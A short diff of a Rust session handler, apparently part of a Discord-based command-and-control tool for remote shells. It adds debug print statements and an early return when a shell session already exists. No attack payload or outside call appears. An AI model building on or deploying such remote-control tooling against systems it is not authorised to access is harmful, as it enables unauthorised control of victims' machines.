@@ -185,10 +185,13 @@ pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteract
     if shell_type.is_some() {
          match ProcessHandler::is_instantiated().await {
             true => {
+                println!("I got here");
                 let agent = get_or_create_agent(ctx).await;
                 send_ephemeral_response(ctx, command, format!("A shell session already exists at the channel <#{}>", agent.get_session_channel().unwrap())).await?;
+                return Ok(())
             },
             false => {
+                println!("But I got here instead");
                 send_ephemeral_response(ctx, command, "Likely a stale or expired session...").await?;
                 return Err(DiscordC2Error::InvalidShellType)
             }
